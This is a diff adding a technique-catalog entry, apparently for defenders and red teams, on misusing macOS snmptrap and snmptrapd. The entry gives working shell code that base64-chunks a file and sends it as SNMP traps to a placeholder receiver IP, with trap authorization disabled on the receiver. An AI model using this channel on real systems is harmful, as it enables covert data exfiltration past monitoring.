@@ -1,0 +1,28 @@
+name: snmptrap
+author: Ryan Conry
+short_description: Send SNMP trap notifications; receive them with snmptrapd.
+full_description: macOS ships with the net-snmp toolkit, which includes snmptrap (/usr/bin/snmptrap) for sending SNMP trap notifications and snmptrapd (/usr/sbin/snmptrapd) for receiving them. SNMP traps are unsolicited UDP notifications sent from an agent to a management station on port 162. The trap payload can carry arbitrary string data under custom OIDs in the private enterprise namespace. This mechanism can be repurposed as a covert file transfer channel by base64-encoding file contents, splitting them into fixed-size chunks, and transmitting each chunk as a trap payload. A trap handler on the receiving end reassembles and decodes the file. The transfer blends into SNMP management traffic and uses a protocol that many detection pipelines do not inspect.
+created: 2026-03-24
+example_use_cases:
+  - name: Covert file transfer via SNMP trap payloads
+    description: Files are base64-encoded and sent as a sequence of SNMP traps carrying chunked data under a custom OID (1.3.6.1.4.1.99999). Three message types are used - FILENAME signals the start of a transfer, DATA carries each base64 chunk, and END triggers reassembly. snmptrapd on the receiver routes all traps to a handler script that writes, reassembles, and decodes the chunks. The resulting file is verified with an MD5 hash.
+    code: "# On receiver: install trap handler script\nsudo tee /usr/local/bin/trap_handler.sh > /dev/null << 'EOF'\n#!/bin/bash\nTRANSFER_DIR=\"/tmp/snmp_transfers\"\nSTATE_FILE=\"/tmp/snmp_transfer_state\"\nmkdir -p \"$TRANSFER_DIR\"\nwhile read line; do\n    if echo \"$line\" | grep -q \"SNMPv2-SMI::enterprises.99999.1\"; then\n        DATA=$(echo \"$line\" | sed 's/.*\"\\(.*\\)\"/\\1/')\n        if [[ \"$DATA\" == FILENAME:* ]]; then\n            FILENAME=\"${DATA#FILENAME:}\"\n            echo \"$FILENAME\" > \"$STATE_FILE\"\n            > \"${TRANSFER_DIR}/${FILENAME}.b64\"\n        elif [[ \"$DATA\" == DATA:* ]]; then\n            if [ -f \"$STATE_FILE\" ]; then\n                FILENAME=$(cat \"$STATE_FILE\")\n                CHUNK=\"${DATA#DATA:}\"\n                echo -n \"$CHUNK\" >> \"${TRANSFER_DIR}/${FILENAME}.b64\"\n            fi\n        elif [[ \"$DATA\" == \"END\" ]]; then\n            if [ -f \"$STATE_FILE\" ]; then\n                FILENAME=$(cat \"$STATE_FILE\")\n                base64 -D < \"${TRANSFER_DIR}/${FILENAME}.b64\" > \"${TRANSFER_DIR}/${FILENAME}\"\n                echo \"MD5: $(md5 -q \"${TRANSFER_DIR}/${FILENAME}\")\"\n                rm \"${TRANSFER_DIR}/${FILENAME}.b64\"\n                rm \"$STATE_FILE\"\n            fi\n        fi\n    fi\ndone\nEOF\nsudo chmod +x /usr/local/bin/trap_handler.sh\n\n# On receiver: configure snmptrapd to route traps to the handler and start it\nsudo tee /etc/snmp/snmptrapd.conf > /dev/null << 'EOF'\ndisableAuthorization yes\ntraphandle default /usr/local/bin/trap_handler.sh\nEOF\nsudo snmptrapd -f -Lo\n\n# On sender: transmit file in chunks\nFILE_PATH=\"/tmp/payload.sh\"\nRECEIVER_IP=\"<RECEIVER_IP>\"\nCHUNK_SIZE=1000\nBASE64_DATA=$(base64 < \"$FILE_PATH\")\nFILE_NAME=$(basename \"$FILE_PATH\")\nsnmptrap -v 2c -c public \"$RECEIVER_IP\" '' 1.3.6.1.4.1.99999 1.3.6.1.4.1.99999.1 s \"FILENAME:$FILE_NAME\"\necho \"$BASE64_DATA\" | fold -w $CHUNK_SIZE | while read chunk; do\n    snmptrap -v 2c -c public \"$RECEIVER_IP\" '' 1.3.6.1.4.1.99999 1.3.6.1.4.1.99999.1 s \"DATA:$chunk\"\n    sleep 0.1\ndone\nsnmptrap -v 2c -c public \"$RECEIVER_IP\" '' 1.3.6.1.4.1.99999 1.3.6.1.4.1.99999.1 s \"END\""
+    tactics:
+      - Lateral Movement
+      - Exfiltration
+      - Command and Control
+    tags:
+      - snmp
+      - snmptrap
+      - snmptrapd
+      - file-transfer
+      - covert-channel
+paths:
+  - /usr/bin/snmptrap
+  - /usr/sbin/snmptrapd
+detections:
+  - name: No detections at time of publishing
+    url: N/A
+resources:
+  - name: 'net-snmp project'
+    url: https://net-snmp.sourceforge.io/
